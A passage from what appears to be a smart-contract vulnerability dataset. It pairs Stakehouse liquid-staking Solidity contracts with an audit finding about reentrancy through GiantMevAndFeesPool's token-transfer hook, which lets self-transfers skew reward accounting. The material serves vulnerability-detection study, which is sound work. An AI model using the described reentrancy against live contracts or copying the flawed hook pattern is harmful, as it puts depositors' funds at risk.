bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\n    /// @notice function to allow admins to withdraw ETH from the vault for staking purpose\n    /// @param _wallet address of the smart wallet that receives ETH\n    /// @param _amount number of ETH withdrawn\n    /// @return number of ETH withdrawn\n    function withdrawETH(address _wallet, uint256 _amount) public onlyManager nonReentrant returns (uint256) {\n        require(_amount >= 4 ether, \"Amount cannot be less than 4 ether\");\n        require(_amount <= address(this).balance, \"Not enough ETH to withdraw\");\n        require(_wallet != address(0), \"Zero address\");\n\n        (bool result,) = _wallet.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n\n        emit ETHWithdrawn(_wallet, msg.sender, _amount);\n\n        return _amount;\n    }\n\n    /// @notice For any knots that are no longer part of syndicate facilitate unstaking so that knot can rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function unstakeSyndicateSharesForRageQuit(\n        address _sETHRecipient,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyManager nonReentrant {\n        Syndicate syndicate = Syndicate(payable(liquidStakingNetworkManager.syndicate()));\n\n        _claimFundsFromSyndicateForDistribution(address(syndicate), _blsPublicKeys);\n\n        updateAccumulatedETHPerLP();\n\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            require(syndicate.isNoLongerPartOfSyndicate(_blsPublicKeys[i]), \"Knot is still active in syndicate\");\n        }\n\n        syndicate.unstake(address(this), _sETHRecipient, _blsPublicKeys, _amounts);\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETHByBLSKeys(address _user, bytes[] calldata _blsPubKeys) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            totalAccumulated += previewAccumulatedETH(_user, token);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETH(address _user, LPToken[] calldata _token) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _token.length; ++i) {\n            totalAccumulated += previewAccumulatedETH(_user, _token[i]);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with a KNOT that has minted derivatives\n    function previewAccumulatedETH(address _user, LPToken _token) public view returns (uint256) {\n        // if token maps to BLS public key that has not been minted derivatives then return zero as it's not eligible\n        bytes memory associatedBLSPublicKeyOfLpToken = KnotAssociatedWithLPToken[_token];\n        if (getAccountManager().blsPublicKeyToLifecycleStatus(associatedBLSPublicKeyOfLpToken) != IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n            return 0;\n        }\n\n        // Looking at this contract balance and the ETH that is yet to be transferred from the syndicate, then tell the user how much ETH they have earned\n        address payable syndicate = payable(liquidStakingNetworkManager.syndicate());\n        return _previewAccumulatedETH(\n            _user,\n            address(_token),\n            _token.balanceOf(_user),\n            totalShares,\n            Syndicate(syndicate).previewUnclaimedETHAsFreeFloatingStaker(\n                address(this),\n                associatedBLSPublicKeyOfLpToken\n            )\n        );\n    }\n\n    /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n        address syndicate = liquidStakingNetworkManager.syndicate();\n        if (syndicate != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            bytes memory blsPubKey = KnotAssociatedWithLPToken[token];\n            require(blsPubKey.length > 0, \"Invalid token\");\n\n            if (getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n                // Claim any ETH for the BLS key mapped to this token\n                bytes[] memory keys = new bytes[](1);\n                keys[0] = blsPubKey;\n                _claimFundsFromSyndicateForDistribution(syndicate, keys);\n\n                // Update the accumulated ETH per minted derivative LP share\n                updateAccumulatedETHPerLP();\n\n                // distribute any due rewards for the `from` user\n                if (_from != address(0)) {\n                    _distributeETHRewardsToUserForToken(_from, address(token), token.balanceOf(_from), _from);\n                }\n\n                // in case the new user has existing rewards - give it to them so that the after transfer hook does not wipe pending rewards\n                _distributeETHRewardsToUserForToken(_to, address(token), token.balanceOf(_to), _to);\n            }\n        }\n    }\n\n    /// @notice After an LP token is transferred, ensure that the new account cannot claim historical rewards\n    function afterTokenTransfer(address, address _to, uint256) external override {\n        if (LiquidStakingManager(payable(liquidStakingNetworkManager)).syndicate() != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            require(KnotAssociatedWithLPToken[token].length > 0, \"Invalid token\");\n\n            // claim is calculated on full balance not amount being transferred so that double claims are not possible\n            claimed[_to][address(token)] = (token.balanceOf(_to) * accumulatedETHPerLPShare) / PRECISION;\n        }\n    }\n\n    /// @notice Claim ETH to this contract from the syndicate that was accrued by a list of actively staked validators\n    /// @param _blsPubKeys List of BLS public key identifiers of validators that have sETH staked in the syndicate for the vault\n    function claimFundsFromSyndicateForDistribution(bytes[] memory _blsPubKeys) external {\n        _claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(), _blsPubKeys);\n    }\n\n    /// @dev Claim ETH from syndicate for a list of BLS public keys for later distribution amongst LPs\n    function _claimFundsFromSyndicateForDistribution(address _syndicate, bytes[] memory _blsPubKeys) internal {\n        require(_syndicate != address(0), \"Invalid configuration\");\n\n        // Claim all of the ETH due from the syndicate for the auto-staked sETH\n        Syndicate syndicateContract = Syndicate(payable(_syndicate));\n        syndicateContract.claimAsStaker(address(this), _blsPubKeys);\n\n        updateAccumulatedETHPerLP();\n    }\n\n    /// @dev Initialization logic\n    function _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {\n        require(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");\n        require(address(_lpTokenFactory) != address(0), \"Zero Address\");\n\n        liquidStakingNetworkManager = _liquidStakingNetworkManager;\n        lpTokenFactory = _lpTokenFactory;\n\n        baseLPTokenName = \"ETHLPToken_\";\n        baseLPTokenSymbol = \"ETHLP_\";\n        maxStakingAmountPerValidator = 4 ether;\n    }\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Strings } from \"@openzeppelin/contracts/utils/Strings.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\n\n/// @dev For pools accepting ETH for validator staking, this contract will manage issuing LPs for deposits\nabstract contract ETHPoolLPFactory is StakehouseAPI {\n\n    /// @notice signalize withdrawing of ETH by depositor\n    event ETHWithdrawnByDepositor(address depositor, uint256 amount);\n\n    /// @notice signalize burning of LP token\n    event LPTokenBurnt(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @notice signalize issuance of new LP token\n    event NewLPTokenIssued(bytes blsPublicKeyOfKnot, address token, address firstDepositor, uint256 amount);\n\n    /// @notice signalize issuance of existing LP token\n    event LPTokenMinted(bytes blsPublicKeyOfKnot, address token, address depositor, uint256 amount);\n\n    /// @dev Base name and symbol used for deploying new LP tokens per KNOT\n    string internal baseLPTokenName;\n    string internal baseLPTokenSymbol;\n\n    /// @notice count of unique LP tokens issued for ETH deposits\n    uint256 public numberOfLPTokensIssued;\n\n    /// @notice Maximum amount that can be staked per validator in WEI\n    uint256 public maxStakingAmountPerValidator;\n\n    /// @notice Minimum amount that can be staked per validator in WEI\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Factory for the deployment of KNOT<>LP Tokens that can be used to redeem dETH\n    LPTokenFactory public lpTokenFactory;\n\n    /// @notice LP token address deployed for a KNOT's BLS public key\n    mapping(bytes => LPToken) public lpTokenForKnot;\n\n    /// @notice KNOT BLS public key associated with the LP token\n    mapping(LPToken => bytes) public KnotAssociatedWithLPToken;\n\n    /// @notice Allow users to rotate the ETH from many LP to another in the event that a BLS key is never staked\n    /// @param _oldLPTokens Array of old LP tokens to be burnt\n    /// @param _newLPTokens Array of new LP tokens to be minted in exchange of old LP tokens\n    /// @param _amounts Array of amount of tokens to be exchanged\n    function batchRotateLPTokens(\n        LPToken[] calldata _oldLPTokens,\n        LPToken[] calldata _newLPTokens,\n        uint256[] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _oldLPTokens.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n\n        for (uint256 i; i < numOfRotations; ++i) {\n            rotateLPTokens(\n                _oldLPTokens[i],\n                _newLPTokens[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked\n    /// @param _oldLPToken Instance of the old LP token (to be burnt)\n    /// @param _newLPToken Instane of the new LP token (to be minted)\n    /// @param _amount Amount of LP tokens to be rotated/converted from old to new\n    function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n        require(address(_oldLPToken) != address(0), \"Zero address\");\n        require(address(_newLPToken) != address(0), \"Zero address\");\n        require(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");\n        require(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n\n        bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n        bytes memory blsPublicKeyOfNewKnot = KnotAssociatedWithLPToken[_newLPToken];\n\n        require(blsPublicKeyOfPreviousKnot.length == 48, \"Incorrect BLS public key\");\n        require(blsPublicKeyOfNewKnot.length == 48, \"Incorrect BLS public key\");\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfNewKnot) ==IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        // burn old tokens and mint new ones\n        _oldLPToken.burn(msg.sender, _amount);\n        emit LPTokenBurnt(blsPublicKeyOfPreviousKnot, address(_oldLPToken), msg.sender, _amount);\n\n        _newLPToken.mint(msg.sender, _amount);\n        emit LPTokenMinted(KnotAssociatedWithLPToken[_newLPToken], address(_newLPToken), msg.sender, _amount);\n    }\n\n    /// @dev Internal business logic for processing staking deposits for single or batch deposits\n    function _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n        require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n\n        // LP token issued for the KNOT\n        // will be zero for a new KNOT because the mapping doesn't exist\n        LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if(address(lpToken) != address(0)) {\n            // KNOT and it's LP token is already registered\n            // mint the respective LP tokens for the user\n\n            // total supply after minting the LP token must not exceed maximum staking amount per validator\n            require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            lpToken.mint(msg.sender, _amount);\n            emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n        }\n        else {\n            // check that amount doesn't exceed max staking amount per validator\n            require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n            \n            // mint new LP tokens for the new KNOT\n            // add the KNOT in the mapping\n            string memory tokenNumber = Strings.toString(numberOfLPTokensIssued);\n            string memory tokenName = string(abi.encodePacked(baseLPTokenName, tokenNumber));\n            string memory tokenSymbol = string(abi.encodePacked(baseLPTokenSymbol, tokenNumber));\n\n            // deploy new LP token and optionally enable transfer notifications\n            LPToken newLPToken = _enableTransferHook ?\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(this), tokenSymbol, tokenName)) :\n                             LPToken(lpTokenFactory.deployLPToken(address(this), address(0), tokenSymbol, tokenName));\n\n            // increase the count of LP tokens\n            numberOfLPTokensIssued++;\n\n            // register the BLS Public Key with the LP token\n            lpTokenForKnot[_blsPublicKeyOfKnot] = newLPToken;\n            KnotAssociatedWithLPToken[newLPToken] = _blsPublicKeyOfKnot;\n\n            // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n            newLPToken.mint(msg.sender, _amount);\n            emit NewLPTokenIssued(_blsPublicKeyOfKnot, address(newLPToken), msg.sender, _amount);\n        }\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\ninterface ITransferHookProcessor {\n    function beforeTokenTransfer(address _from, address _to, uint256 _amount) external;\n    function afterTokenTransfer(address _from, address _to, uint256 _amount) external;\n}\n\n",
        "CodeNames": [
            "GiantMevAndFeesPool.sol",
            "IGateKeeper.sol",
            "Syndicate.sol",
            "ILPTokenInit.sol",
            "GiantLP.sol",
            "StakingFundsVault.sol",
            "ETHPoolLPFactory.sol",
            "ITransferHookProcessor.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "beforeTokenTransfer`, **GiantMevAndFeesPool** contract",
                "Location": [
                    "transferFrom",
                    "_mint",
                    "_recipient",
                    "beforeTokenTransfer",
                    "due",
                    "transferHookProcessor",
                    "call",
                    "_afterTokenTransfer",
                    "lastInteractedTimestamp",
                    "_burn",
                    "_distributeETHRewardsToUserForToken",
                    "claimed",
                    "amount",
                    "transfer"
                ],
                "Type": "(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167):",
                "Description": "\nThe contract GiantLP use the GiantMevAndFeesPool contract as transferHookProcessor(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14) and when use the functions _mint, _burn, transferFrom and transfer of the ERC20(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol), the function beforeTokenTransfer(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) implemented in the GiantMevAndFeesPool bring a possibility to make a reentrancy attack because in the function _distributeETHRewardsToUserForToken(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73) implemented in the GiantMevAndFeesPool make a call to the _recipient(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68)\n\nA contract can call the function transfer of GiantLP contract several time, transfer an amount from and to self, as the update of the claimed(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203) would not be done until, it is executed the function _afterTokenTransfer(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47) of the GiantLP contract, the due(https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61) amount calculated in _distributeETHRewardsToUserForToken of SyndicateRewardsProcessor contract and the lastInteractedTimestamp of GiantLP contract will be incorrect\n\n##\n",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { ETHPoolLPFactory } from \"./ETHPoolLPFactory.sol\";\nimport { LiquidStakingManager } from \"./LiquidStakingManager.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\n\n/// @title MEV and fees vault for a specified liquid staking network\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, SyndicateRewardsProcessor, ReentrancyGuard\n{\n\n    /// @notice signalize that the vault received ETH\n    event ETHDeposited(address sender, uint256 amount);\n\n    /// @notice signalize ETH withdrawal from the vault\n    event ETHWithdrawn(address receiver, address admin, uint256 amount);\n\n    /// @notice signalize ERC20 token recovery by the admin\n    event ERC20Recovered(address admin, address recipient, uint256 amount);\n\n    /// @notice signalize unwrapping of WETH in the vault\n    event WETHUnwrapped(address admin, uint256 amount);\n\n    /// @notice Address of the network manager\n    LiquidStakingManager public liquidStakingNetworkManager;\n\n    /// @notice Total number of LP tokens issued in WEI\n    uint256 public totalShares;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _liquidStakingNetworkManager address of the liquid staking network manager\n    function init(address _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) external virtual initializer {\n        _init(LiquidStakingManager(payable(_liquidStakingNetworkManager)), _lpTokenFactory);\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == address(liquidStakingNetworkManager), \"Only network manager\");\n        _;\n    }\n\n    /// @notice Allows the liquid staking manager to notify funds vault about new derivatives minted to enable MEV claiming\n    function updateDerivativesMinted() external onlyManager {\n        // We know 4 ETH for the KNOT came from this vault so increase the shares to get a % of vault rewards\n        totalShares += 4 ether;\n    }\n\n    /// @notice For knots that have minted derivatives, update accumulated ETH per LP\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(totalShares);\n    }\n\n    /// @notice Batch deposit ETH for staking against multiple BLS public keys\n    /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n    /// @param _amounts Amounts of ETH being staked for each BLS public key\n    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"Empty arrays\");\n        require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        uint256 totalAmount;\n        for (uint256 i; i < numOfValidators; ++i) {\n            require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is not part of LSD network\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n\n            LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            if (address(tokenForKnot) != address(0)) {\n                // Give anything owed to the user before making updates to user state\n                _distributeETHRewardsToUserForToken(\n                    msg.sender,\n                    address(tokenForKnot),\n                    tokenForKnot.balanceOf(msg.sender),\n                    msg.sender\n                );\n            }\n\n            uint256 amount = _amounts[i];\n            totalAmount += amount;\n\n            _depositETHForStaking(_blsPublicKeyOfKnots[i], amount, true);\n\n            // Ensure user cannot get historical rewards\n            tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n        }\n\n        // Ensure that the sum of LP tokens issued equals the ETH deposited into the contract\n        require(msg.value == totalAmount, \"Invalid ETH amount attached\");\n    }\n\n    /// @notice Deposit ETH against a BLS public key for staking\n    /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n    /// @param _amount Amount of ETH being staked\n    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n        require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(msg.value == _amount, \"Must provide correct amount of ETH\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        // Give anything owed to the user before making updates to user state\n        LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if (address(tokenForKnot) != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                msg.sender,\n                address(tokenForKnot),\n                tokenForKnot.balanceOf(msg.sender),\n                msg.sender\n            );\n        }\n\n        _depositETHForStaking(_blsPublicKeyOfKnot, _amount, true);\n\n        // Ensure user cannot get historical rewards\n        tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n\n        return _amount;\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked by BLS public key\n    /// @param _blsPublicKeys List of BLS public keys that received ETH for staking\n    /// @param _amounts List of amounts of LP tokens being burnt\n    function burnLPTokensForETHByBLS(bytes[] calldata _blsPublicKeys, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _blsPublicKeys.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            LPToken token = lpTokenForKnot[_blsPublicKeys[i]];\n            require(address(token) != address(0), \"No ETH staked for specified BLS key\");\n            burnLPForETH(token, _amounts[i]);\n        }\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked\n    /// @param _lpTokens Address of LP tokens being burnt\n    /// @param _amounts Amount of LP tokens being burnt\n    function burnLPTokensForETH(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _lpTokens.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            burnLPForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice For a user that has deposited ETH that has not been staked, allow them to burn LP to get ETH back\n    /// @param _lpToken Address of the LP token being burnt\n    /// @param _amount Amount of LP token being burnt\n    function burnLPForETH(LPToken _lpToken, uint256 _amount) public nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _lpToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(address(_lpToken) != address(0), \"Zero address specified\");\n\n        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Cannot burn LP tokens\"\n        );\n        require(_lpToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Too new\");\n\n        updateAccumulatedETHPerLP();\n\n        _lpToken.burn(msg.sender, _amount);\n\n        (bool result,) = msg.sender.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n        emit ETHWithdrawnByDepositor(msg.sender, _amount);\n\n        emit LPTokenBurnt(blsPublicKeyOfKnot, address(_lpToken), msg.sender, _amount);\n    }\n\n    /// @notice Any LP tokens for BLS keys that have had their derivatives minted can claim ETH from the syndicate contract\n    /// @param _blsPubKeys List of BLS public keys being processed\n    function claimRewards(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\n    /// @notice function to allow admins to withdraw ETH from the vault for staking purpose\n    /// @param _wallet address of the smart wallet that receives ETH\n    /// @param _amount number of ETH withdrawn\n    /// @return number of ETH withdrawn\n    function withdrawETH(address _wallet, uint256 _amount) public onlyManager nonReentrant returns (uint256) {\n        require(_amount >= 4 ether, \"Amount cannot be less than 4 ether\");\n        require(_amount <= address(this).balance, \"Not enough ETH to withdraw\");\n        require(_wallet != address(0), \"Zero address\");\n\n        (bool result,) = _wallet.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n\n        emit ETHWithdrawn(_wallet, msg.sender, _amount);\n\n        return _amount;\n    }\n\n    /// @notice For any knots that are no longer part of syndicate facilitate unstaking so that knot can rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function unstakeSyndicateSharesForRageQuit(\n        address _sETHRecipient,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyManager nonReentrant {\n        Syndicate syndicate = Syndicate(payable(liquidStakingNetworkManager.syndicate()));\n\n        _claimFundsFromSyndicateForDistribution(address(syndicate), _blsPublicKeys);\n\n        updateAccumulatedETHPerLP();\n\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            require(syndicate.isNoLongerPartOfSyndicate(_blsPublicKeys[i]), \"Knot is still active in syndicate\");\n        }\n\n        syndicate.unstake(address(this), _sETHRecipient, _blsPublicKeys, _amounts);\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETHByBLSKeys(address _user, bytes[] calldata _blsPubKeys) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            totalAccumulated += previewAccumulatedETH(_user, token);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function 